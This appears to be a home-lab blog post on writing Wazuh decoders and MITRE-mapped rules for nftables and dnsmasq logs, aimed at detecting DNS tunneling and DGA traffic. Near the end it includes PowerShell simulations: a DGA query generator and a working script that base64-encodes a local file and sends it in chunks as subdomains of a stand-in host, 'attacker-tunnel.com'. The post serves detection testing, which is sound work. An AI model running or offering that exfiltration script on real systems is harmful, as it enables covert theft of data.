Developing Wazuh Decoders and Rules for Lab Firewall

Date: Aug 8, 2026
Tags: Network Security Threat Detection Log Management Regex SIEM DNS Firewall Wazuh nftables dnsmasq Powershell Nmap Linux

I. Project Summary

In my previous lab entries, I configured a network firewall and routed its logs to a Wazuh SIEM. However, raw logs have limited context, making it difficult for detection rules to correlate specific attributes such as DNS query type, source IP, and firewall action.

To solve this, I created custom PCRE2 decoders to extract structured fields from nftables and dnsmasq logs. I then created detection rules mapped to the MITRE ATT&CK framework to identify possible indicators of compromise, such as spikes in NXDOMAIN queries and abnormally long DNS queries. Identifying these attacks early can help defenders investigate and respond before they lead to further impact.

II. Key Engineering Decisions
1. Created and Enhanced Telemetry Parsing
  • Developed custom Wazuh decoders for dnsmasq and nftables telemetry using PCRE2 regular expressions. The parsers extract contextual fields such as source IP, DNS query type, requested domain, firewall action, and network interface. This enables more accurate rule matching and improves investigation and threat hunting.
Enhanced Nftables and Custom Dnsmasq Decoders

Nftables
I first started by running wazuh-logtest and discovered nftables log matches with the built in kernel and its child iptables decoder which does not extract the fields that i needed so I created a custom decoder:

<decoder name="kernel">
  <program_name>^kernel</program_name>
</decoder>
<decoder name="antix-nftables">
   <parent>kernel</parent>
   <prematch type="pcre2">NFT-(?:IN|FOR|OUT)-(?:DROP|ACCEPT)</prematch>
   <regex type="pcre2">NFT-(IN|FOR|OUT)-(DROP|ACCEPT)(?:-(\S+))?\s+IN=(\S*)\s+OUT=(\S*)\s+(?:MAC=\S*\s+)?SRC=([0-9.]+)\s+DST=([0-9.]+).*?PROTO=(\w+)(?:\s+SPT=(\d+)\s+DPT=(\d+))?(?:\s+TYPE=(\d+)\s+CODE=(\d+))?</regex>
order>nft_chain,nft_action,nft_rule,nft_srcint,nft_dstint,srcip,dstip,protocol,srcport,dstport,icmp_type,icmp_code</order>
</decoder>

File: /var/ossec/etc/decoders/nftables.xml (Wazuh_Server)

Dnsmasq
While dnsmasq also matches a built-in Wazuh decoder, it was unable to extract any useful fields so i created a custom decoder for dnsmasq. There are multiple decoders this time because dnsmasq logs have multiple formats.

<decoder name="antix-dnsmasq">
  <program_name>^dnsmasq</program_name>
</decoder>

<!-- log: dnsmasq: 1001 10.0.0.50/51234 query[A] ://google.com from 10.0.0.50 -->
<decoder name="antix-dnsmasq-query">
  <parent>antix-dnsmasq</parent>
  <prematch type="pcre2">query\[\w+\]</prematch>
  <regex type="pcre2">^(\d+)\s+([0-9.]+)\/([0-9]+)\s+(query\[\w+\])\s+(\S+)</regex>
  <order>id,srcip,srcport,dns_action,url</order>
</decoder>

<!-- log: dnsmasq: 1001 10.0.0.50/51234 forwarded ://google.com to 8.8.8.8 -->
<decoder name="antix-dnsmasq-forwarded">
<parent>antix-dnsmasq</parent>
<prematch type="pcre2">forwarded</prematch>
<regex type="pcre2">^(\d+)\s+([0-9.]+)\/([0-9]+)\s+(forwarded)\s+(\S+)\s+to\s+(\S+)</regex>
  <order>id,srcip,srcport,dns_action,url,resolved_to</order>
</decoder>

<!-- log: dnsmasq: 1001 10.0.0.50/51234 reply ://google.com is 142.250.190.36 -->
<decoder name="antix-dnsmasq-reply">
 <parent>antix-dnsmasq</parent>
 <prematch type="pcre2">reply</prematch>
 <regex type="pcre2">^(\d+)\s+([0-9.]+)\/([0-9]+)\s+(reply)\s+(\S+)\s+is\s+(.+)</regex>
  <order>id,srcip,srcport,dns_action,url,resolved_to</order>
</decoder>

<!-- log: dnsmasq: 1012 10.0.0.50/51245 config www.chess.com is NXDOMAIN -->
<decoder name="antix-dnsmasq-local">
<parent>antix-dnsmasq</parent>
<prematch type="pcre2">config|/etc/hosts|cached</prematch>
<regex type="pcre2">^(\d+)\s+([0-9.]+)\/([0-9]+)\s+(\S+)\s+(\S+)\s+is\s+(.+)</regex>
  <order>id,srcip,srcport,dns_action,url,resolved_to</order>
</decoder>

<!-- log: dnsmasq[6203]: exiting on receipt of SIGTERM  -->
<decoder name="antix-dnsmasq-status">
   <parent>antix-dnsmasq</parent>
   <prematch type="pcre2">started|exiting</prematch>
   <regex type="pcre2">^(.+)</regex>
   <order>status_msg</order>
</decoder>

File: /var/ossec/etc/decoders/dnsmasq.xml (Wazuh_Server)

2. Layer 7 DNS Telemetry Analysis
  • Implemented DNS anomaly detection rules in Wazuh to identify characteristics commonly associated with DNS tunneling, such as unusually long query names and excessive TXT/NULL query activity.
Captures Some Possible DNS-based Attacks

Rule 100214 and 100215 will fire when the same IP performed a DNS query for long domain + txt/null and long domain + common record type respectively. These are possible indicators of exfiltration. Rule 100211 will trigger a level 4 alert when same source IP is requested for txt (typically used by attackers to transfer commands to the infected host) and null (rarely seen on production environment). Rule 100220 will trigger a level 7 alert when the same source IP performed 20 queries for non-existent domain within 60 second which can identify possible DGA attacks.

<rule id="100214" level="5">
	<if_sid>100201</if_sid>
	<field name="dns_action" type="pcre2">query\[(TXT|NULL)\]</field>
	<url type="pcre2">^.{60,}$</url>
	<description>DNS query exceeded expected domain length threshold using uncommon record type.</description>
</rule> 
<rule id="100215" level="3">
	<if_sid>100201</if_sid>
	<field name="dns_action" type="pcre2">query\[(A|AAAA|CNAME|SRV|MX|PTR)\]</field>
	<url type="pcre2">^.{60,}$</url>
	<description>DNS query exceeded expected domain length threshold using common record type.</description>
</rule>
<rule id="100211" level="4">
	<if_sid>100201</if_sid>
	<field name="dns_action" type="pcre2">query\[(TXT|NULL)\]</field>
	<description>DNS query observed for uncommon resource record type.</description>
	<mitre>
		<id>T1071.004</id>
	</mitre>
</rule>
<rule id="100207" level="2">
	<field name="resolved_to">NXDOMAIN</field>
	<description>DNS response returned NXDOMAIN status.</description>
</rule>
<rule id="100220" level="7" frequency="20" timeframe="60">
	<if_matched_sid>100207</if_matched_sid>
	<same_srcip />
	<description>Repeated NXDOMAIN responses observed from same source IP. Possible DGA-like domain activity or reconnaissance behavior.</description>
	<mitre>
		<id>T1568.002</id>
	</mitre>
</rule>

3. Basic Behavioral Detection Rule over Hardcoded Signature
  • Implemented behavioral DNS detection by monitoring abnormal NXDOMAIN response frequency from individual hosts. This helps identify potential DGA activity where a malware is looking for the command-and-control server.
Detecting Possible DGA Attack

The nature of DGA (Domain Generation Algorithm) attacks makes it extremely difficult for hardcoded firewall signatures to detect and completely block them. So I implemented a behavioral ruleset that monitors and generates a high-severity alert when it detected a host querying 20 non-existent domains within 60 seconds which could be an indicator of DGA activity.

<rule id="100203" level="2">
	<if_sid>100200</if_sid>
	<field name="dns_action">reply</field>
	<description>DNS response received from upstream resolver.</description>
</rule>

<rule id="100207" level="2">
	<if_sid>100203</if_sid>
	<field name="resolved_to">NXDOMAIN</field>
	<description>DNS response returned NXDOMAIN status.</description>
</rule>

<rule id="100220" level="7" frequency="20" timeframe="60">
	<if_matched_sid>100207</if_matched_sid>
	<same_srcip />
	<description>Repeated NXDOMAIN responses observed from same source IP. Possible DGA-like domain activity or reconnaissance behavior.</description>
	<mitre>
		<id>T1568.002</id>
	</mitre>
</rule>
4. Reduced Alert Fatigue
  • Designed correlation-based detection rules using frequency and timeframe thresholds to reduce low-confidence alerts. Informational events are retained for visibility, while higher severity alerts require repeated suspicious behavior patterns.
Frequency-based Rule Design

While every log is decoded, many are retained solely for backend visibility and correlation. Base rules will rarely trigger on a single log, instead, it must meet the specified frequency thresholds or trigger a chain of rules in a short period of time.

III. Challenges
Challenges Probable Cause Fixes
Existing parent decoder is not valid ERROR: (2101): Parent decoder name invalid: 'kernel'. A custom decoder is accessing a built-in parent decoder I redeclared the parent decoder (kernel) along with the custom nftables decoder.
Inconsistent nftables log fields and different dnsmasq log formats. Developer implementation, multi-line log formats. I used option regex for fields that are sometimes missing on the logs.
I created separate decoders to match multi-line logs where option regex would make decoders difficult to read.
Verifying whether all possible log formats will match the decoders. No official collections of possible logs that will be generated by the software used.
I customized my nftables log structure using the log prefix.		 Observed the actual logs generated and used Gen AI LLMs to hypothesize possible variations based on the available fields.
Balancing parsing precision over CPU compute overhead Wazuh's default os_regex is highly efficient but lacks the ability to match complex patterns. Used pcre2 regex to ensure precise telemetry mapping while using os_regex for parent filters.
Custom decoders are not parsing the firewall logs on wazuh-logtest I used a sample log from wazuh's archive.log which is different from actual log due to rsyslog forwarding and preprocessing. I used the raw log generated directly on the firewall host.

DGA-like DNS Anomaly Simulation (Rule 100220)

Attack Execution
To emulate a basic DGA attack traffic, I used a PowerShell script that uses a simple date-based computation as a seed for a pseudo-random number generator (PRNG). The script then generates and queries 30 pseudo-random {domain}.com names, causing the host to receive a high number of NXDOMAIN responses. Although the DGA script specifies a custom DNS resolver, the firewall redirects DNS traffic to dnsmasq, allowing the queries to be logged and analyzed by Wazuh.

$TargetDNS = "8.8.8.8"
# 1. Gather date variables
$Date = Get-Date
$Year = $Date.Year
$Day = $Date.Day
$DayOfWeek = $Date.DayOfWeek.ToString()
$CountDayOfWeek = $DayOfWeek.Length

# 2. Calculate the Custom Key: (Year * Day * count(dayofweek)) - Day 
$Key = ($Year * $Day * $CountDayOfWeek) - $Day 

# 3. Seed the Random Number Generator for reproducible DGA output
$Rand = New-Object System.Random($Key)

# 4. Generate 30 domains and blast the DNS server
for ($i = 1; $i -le 30; $i++) {
    # Generate a random domain length between 10 and 15 characters
    $DomainLength = $Rand.Next(10, 16)
    
    # Pick random lowercase letters (ASCII 97-122)
    $Chars = (1..$DomainLength) | ForEach-Object { [char]$Rand.Next(97, 123) }
    $Domain = (-join $Chars) + ".com"
    
    # Send the query and ignore the inevitable NXDOMAIN errors
    Resolve-DnsName -Name $Domain -Server $TargetDNS -QuickTimeout -ErrorAction SilentlyContinue | Out-Null
    # Tiny sleep to ensure packets space out properly
    Start-Sleep -Milliseconds 50
}

DNS Exfiltration Simulation (Rule 100230)

Attack Execution
To simulate a malware generating DNS tunneling/exfiltration traffic, I encoded a file into BASE64, then split it into smaller chunks and then performed a DNS lookup where the encoded data will be passed to the attacker as a subdomain along with its chunk's position.

$SourcePath = "$env:USERPROFILE\Documents\Data\Datasets\Lauren Furniture Store Transactions.csv"
$TempStaging = "$env:TEMP\staged_data.tmp"
$TargetDNS   = "172.16.0.1"
$FakeDomain  = "attacker-tunnel.com"

Write-Host "[+] Staging entire file..."
if (Test-Path $SourcePath) {
    # Copies the complete file to the temp directory
    Copy-Item -Path $SourcePath -Destination $TempStaging -Force
} else {
    "TransactionID,Customer,Amount`n1001,DemoUser,250.00" | Out-File -FilePath $TempStaging -Encoding utf8
}

Write-Host "[+] Preparing 45-character Base64 chunks..."
$RawBytes = [System.IO.File]::ReadAllBytes($TempStaging)
$Base64Data = [Convert]::ToBase64String($RawBytes)

$ChunkSize = 45
$Chunks = [regex]::Matches($Base64Data, ".{1,$ChunkSize}") | ForEach-Object { $_.Value }

Write-Host "[+] Transmitting $($Chunks.Count) chunks via DNS NULL queries... (This will take about a minute)"
$Counter = 1
foreach ($Chunk in $Chunks) {
    # Sanitize the Base64 string for valid DNS characters
    $SafeChunk = $Chunk -replace '\+', '-' -replace '/', '_' -replace '=', ''
    
    # FORMAT: [45-Char-Base64].seq[Counter].attacker-tunnel.com
    $QueryFQDN = "$SafeChunk.seq$Counter.$FakeDomain"
    Resolve-DnsName -Name $QueryFQDN -Type NULL -Server $TargetDNS -QuickTimeout -ErrorAction SilentlyContinue | Out-Null
    
    $Counter++
    Start-Sleep -Milliseconds 100
}

if (Test-Path $TempStaging) { Remove-Item -Path $TempStaging -Force }
Write-Host "`n[✓] Full file exfiltration complete! Artifacts cleaned up."

V. Lessons Learned
  • Defenders have to carefully balance alert fatigue and catching stealthy attacks. While setting a rule for dropped packets with frequency thresholds of 20 queries over 60 seconds reduces false positives, attackers using low and slow tactics such as nmap with -T0 or -T1 flags will completely evade the rule.
  • The ability of attackers to evade detection mechanisms highlights the importance of defense-in-depth which tries to monitor and flag indicators of compromise on multiple layers of the environment.
  • While wazuh-logtest is useful for verifying decoders and individual rules, frequency-based correlation rules are best validated with real log events generated with realistic attack simulations.
